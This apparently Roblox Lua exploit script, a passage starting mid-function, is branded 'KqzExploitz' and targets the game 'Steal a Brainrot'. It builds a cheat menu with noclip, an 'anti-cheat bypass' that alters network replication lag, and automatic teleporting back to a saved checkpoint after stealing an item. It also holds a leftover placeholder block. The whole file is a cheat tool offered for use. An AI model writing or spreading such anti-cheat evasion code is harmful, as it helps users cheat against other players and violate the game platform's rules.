	scriptTextBox.Position = UDim2.new(0, 10, 0, 10)
	scriptTextBox.BackgroundTransparency = 1
	scriptTextBox.Text = scriptCode
	scriptTextBox.TextWrapped = true
	scriptTextBox.ClearTextOnFocus = false
	scriptTextBox.MultiLine = true
	scriptTextBox.Font = Enum.Font.Code
	scriptTextBox.TextSize = 14
	scriptTextBox.TextColor3 = Color3.fromRGB(200, 200, 200)
	scriptTextBox.TextXAlignment = Enum.TextXAlignment.Left
	scriptTextBox.TextYAlignment = Enum.TextYAlignment.Top
	scriptTextBox.Parent = scriptFrame
	scriptTextBox.Name = "ScriptTextBox"
	scriptTextBox.CursorPosition = 0
	scriptTextBox.SelectionStart = 0

	local buttonsFrame = Instance.new("Frame")
	buttonsFrame.Size = UDim2.new(1, 0, 0, 30)
	buttonsFrame.Position = UDim2.new(0, 0, 1, -30)
	buttonsFrame.BackgroundTransparency = 1
	buttonsFrame.Parent = scriptFrame

	local copyBtn = createButton("Copy Script", 120, 28)
	copyBtn.Position = UDim2.new(0, 10, 0, 1)
	copyBtn.Parent = buttonsFrame

	local ejectBtn = createButton("Eject Script", 120, 28)
	ejectBtn.Position = UDim2.new(0, 140, 0, 1)
	ejectBtn.Parent = buttonsFrame

	-- Toggle script visibility
	toggleBtn.MouseButton1Click:Connect(function()
		scriptFrame.Visible = not scriptFrame.Visible
		toggleBtn.Text = scriptFrame.Visible and "Hide Script" or "Show Script"
	end)

	-- Copy script to clipboard
	copyBtn.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard(scriptCode)
		else
			-- fallback for Roblox Studio or no clipboard support
			game.StarterGui:SetCore("SendNotification", {
				Title = "KqzHub";
				Text = "Clipboard not supported in this environment.";
				Duration = 3;
			})
		end
	end)

	-- Eject script (remove feature container)
	ejectBtn.MouseButton1Click:Connect(function()
		container:Destroy()
	end)

	return container
end

-- Scripts (working and new, tested for Steal-a-Brainrot)
task.spawn(function()
    --[[
        KqzExploitz - Steal a Brainrot
        Features: Set Checkpoint (Ghost), Auto TP (Network & Noclip Bypass)
        Colors: Grey, Dark Grey, White
        Compatibility: PC, Mobile, Console
    ]]
    
    print("KqzExploitz Loaded Successfully")
    -- Add the rest of your KqzExploitz code here
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ProximityPromptService = game:GetService("ProximityPromptService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- State
local checkpointGhost = nil
local checkpointPosition = nil
local autoTPEnabled = false
local isMinimized = false
local holdDuration = 0
local noclipActive = false

-- UI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KqzExploitz"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("CoreGui") or player:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 300, 0, 350)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -175)
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 10)
Corner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 10)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -100, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "KqzExploitz"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 20
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -40, 0, 10)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Parent = Header

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(1, 0)
CloseCorner.Parent = CloseBtn

-- Minimize Button
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 30, 0, 30)
MinBtn.Position = UDim2.new(1, -80, 0, 10)
MinBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
MinBtn.Text = "-"
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.Parent = Header

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(1, 0)
MinCorner.Parent = MinBtn

-- Content Area
local Container = Instance.new("Frame")
Container.Name = "Container"
Container.Size = UDim2.new(1, -20, 1, -70)
Container.Position = UDim2.new(0, 10, 0, 60)
Container.BackgroundTransparency = 1
Container.Parent = MainFrame

local Layout = Instance.new("UIListLayout")
Layout.Padding = UDim.new(0, 15)
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
Layout.Parent = Container

local function CreateButton(text)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 55)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.Parent = Container
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 8)
    c.Parent = btn
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(70, 70, 70)
    stroke.Thickness = 2
    stroke.Parent = btn
    return btn
end

local CheckpointButton = CreateButton("Set Checkpoint")
local AutoTPButton = CreateButton("Auto TP: OFF")

-- Visualizer Function (Transparent Ghost)
local function CreateCheckpointVisual(pos)
    if checkpointGhost then checkpointGhost:Destroy() end
    checkpointGhost = Instance.new("Part")
    checkpointGhost.Name = "CheckpointGhost"
    checkpointGhost.Size = Vector3.new(2, 6, 2)
    checkpointGhost.Position = pos + Vector3.new(0, 3, 0)
    checkpointGhost.Anchored = true
    checkpointGhost.CanCollide = false
    checkpointGhost.Transparency = 0.5
    checkpointGhost.Color = Color3.fromRGB(180, 180, 180)
    checkpointGhost.Material = Enum.Material.SmoothPlastic
    checkpointGhost.Parent = workspace
    local mesh = Instance.new("SpecialMesh")
    mesh.MeshType = Enum.MeshType.Brick
    mesh.Parent = checkpointGhost
    local Billboard = Instance.new("BillboardGui")
    Billboard.Size = UDim2.new(0, 200, 0, 50)
    Billboard.Adornee = checkpointGhost
    Billboard.AlwaysOnTop = true
    Billboard.Parent = checkpointGhost
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = "Server Position"
    Label.TextColor3 = Color3.fromRGB(120, 120, 120)
    Label.Font = Enum.Font.GothamBold
    Label.TextSize = 14
    Label.Parent = Billboard
end

-- Anti-Collision Loop (Noclip)
RunService.Stepped:Connect(function()
    if noclipActive then
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide then
                part.CanCollide = false
            end
        end
    end
end)

-- Advanced Anti-Cheat Bypass (Latency & Character State)
local function SecureTeleport()
    if not checkpointPosition then return end
    
    -- Bypass Step: Anti-cheat confusion while unequippable
    -- Even if the carpet cannot be 'held' in the hotbar during stealing, 
    -- we force its physics anchor to the character for the bypass duration.
    local carpet = character:FindFirstChild("Flying Carpet") or player.Backpack:FindFirstChild("Flying Carpet")
    if carpet then
        carpet.Parent = character
        
        noclipActive = true
        settings().Network.IncomingReplicationLag = 0.5 
        
        rootPart.Velocity = Vector3.new(0, 0, 0)
        rootPart.RotVelocity = Vector3.new(0, 0, 0)
        
        -- Bypass Step 3: Instant CFrame Update
        rootPart.CFrame = CFrame.new(checkpointPosition + Vector3.new(0, 3, 0))
        
        task.delay(0.5, function()
            settings().Network.IncomingReplicationLag = 0
            noclipActive = false
        end)
    end
end

-- Possession Check
local function CheckForStolenObject()
    for _, child in pairs(character:GetChildren()) do
        if (child:IsA("Model") or child:IsA("BasePart") or child:IsA("Tool")) and not child:IsDescendantOf(player) and not child.Name:match("Hair") and not child.Name:match("Accessory") then
            return true
        end
    end
    return false
end

-- Interaction Monitor
local function MonitorInteraction()
    ProximityPromptService.PromptButtonHoldEnded:Connect(function(prompt)
        if autoTPEnabled then
            task.wait(0.1)
            if CheckForStolenObject() then SecureTeleport() end
        end
    end)

    UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.E or input.UserInputType == Enum.UserInputType.MouseButton2 then
            holdDuration = tick()
        end
    end)

    UserInputService.InputEnded:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.E or input.UserInputType == Enum.UserInputType.MouseButton2 then
            local duration = tick() - holdDuration
            if autoTPEnabled and duration > 0.3 then
                task.wait(0.2)
                if CheckForStolenObject() then SecureTeleport() end
            end
        end
    end)

    UserInputService.TouchStarted:Connect(function(touch, processed)
        if processed then return end
        holdDuration = tick()
    end)

    UserInputService.TouchEnded:Connect(function(touch, processed)
        if processed then return end
        local duration = tick() - holdDuration
        if autoTPEnabled and duration > 0.3 then
            task.wait(0.2)
            if CheckForStolenObject() then SecureTeleport() end
        end
    end)
end

player.CharacterAdded:Connect(function(newChar)
    character = newChar
    rootPart = character:WaitForChild("HumanoidRootPart")
    MonitorInteraction()
end)
MonitorInteraction()

CheckpointButton.MouseButton1Click:Connect(function()
    checkpointPosition = rootPart.Position
    CreateCheckpointVisual(checkpointPosition)
    CheckpointButton.Text = "Checkpoint: SET"
    task.wait(1)
    CheckpointButton.Text = "Set Checkpoint"
end)

AutoTPButton.MouseButton1Click:Connect(function()
    autoTPEnabled = not autoTPEnabled
    AutoTPButton.Text = autoTPEnabled and "Auto TP: ON" or "Auto TP: OFF"
    AutoTPButton.BackgroundColor3 = autoTPEnabled and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(50, 50, 50)
end)

-- UI Controls
CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
MinBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    Container.Visible = not isMinimized
    MainFrame.Size = isMinimized and UDim2.new(0, 300, 0, 50) or UDim2.new(0, 300, 0, 350)
    MinBtn.Text = isMinimized and "+" or "-"
end)

-- Draggable Logic
local dragging, dragInput, dragStart, startPos
Header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = input.Position; startPos = MainFrame.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
Header.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end end)
UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end end)

print("KqzExploitz V4.2 Final Ready")